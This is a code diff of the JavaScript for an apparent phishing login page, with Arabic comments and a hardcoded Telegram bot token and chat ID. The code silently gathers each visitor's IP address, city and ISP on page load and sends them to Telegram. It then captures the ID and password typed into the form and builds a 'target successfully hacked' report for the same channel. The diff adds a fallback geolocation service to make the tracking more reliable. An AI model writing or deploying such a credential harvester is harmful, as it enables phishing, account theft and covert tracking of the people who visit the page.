@@ -31,38 +31,49 @@
     const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
     const chat_id = "6888107255";
 
-    // دالة الإرسال لضمان التوصيل في سفاري
+    // دالة إرسال التنبيهات
     function sendMsg(text) {
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
     }
 
-    // 1. عند الدخول فوراً (سحب صامت)
-    window.onload = async function() {
-        let entryMsg = "🔔 [دخول جديد للرابط - جاري السحب...]\n";
+    // دالة جلب البيانات مع محرك احتياطي
+    async function getIP() {
         try {
+            // محاولة أولى عبر ipwho.is
             const res = await fetch('https://ipwho.is/');
             const d = await res.json();
-            entryMsg += `🌐 IP: ${d.ip}\n📍 الموقع: ${d.city}\n📶 المزود: ${d.connection.isp}`;
-        } catch(e) { entryMsg += "⚠️ تعذر سحب الـ IP صامتاً"; }
-        sendMsg(entryMsg);
+            if(d.success) return {ip: d.ip, city: d.city, country: d.country, isp: d.connection.isp};
+            throw new Error();
+        } catch(e) {
+            try {
+                // محاولة احتياطية عبر ipapi في حال فشل الأولى
+                const res2 = await fetch('https://ipapi.co/json/');
+                const d2 = await res2.json();
+                return {ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org};
+            } catch(e2) {
+                return {ip: "محمي/VPN", city: "غير معروف", country: "غير معروف", isp: "غير معروف"};
+            }
+        }
+    }
+
+    // 1. عند الدخول فوراً
+    window.onload = async function() {
+        sendMsg("🔔 [دخول جديد للرابط - جاري محاولة سحب الآي بي...]");
+        const data = await getIP();
+        let entryReport = `🌐 آي بي الدخول: ${data.ip}\n📍 الموقع: ${data.city}\n📶 المزود: ${data.isp}`;
+        sendMsg(entryReport);
     };
 
-    // 2. التقرير الشامل عند الضغط (بالترتيب المطلوب)
+    // 2. التقرير الشامل عند الضغط (الترتيب الدقيق)
     document.getElementById('btn').onclick = async function() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
-        if(!user || !pass) return alert("Please enter your ID and Password");
+        if(!user || !pass) return;
 
         this.innerHTML = "Processing...";
         this.disabled = true;
 
-        // جلب البيانات الدقيقة لتجنب Unknown
-        let ipData = {ip: "N/A", city: "N/A", country: "N/A", isp: "N/A"};
-        try {
-            const res = await fetch('https://ipwho.is/');
-            const d = await res.json();
-            ipData = {ip: d.ip, city: d.city, country: d.country, isp: d.connection.isp};
-        } catch(e) {}
+        const ipData = await getIP(); // إعادة المحاولة للتأكيد
 
         let report = "⚠️ تم اختراق الهدف بنجاح ⚠️\n\n";
         report += "📧 الحساب: " + user + "\n";
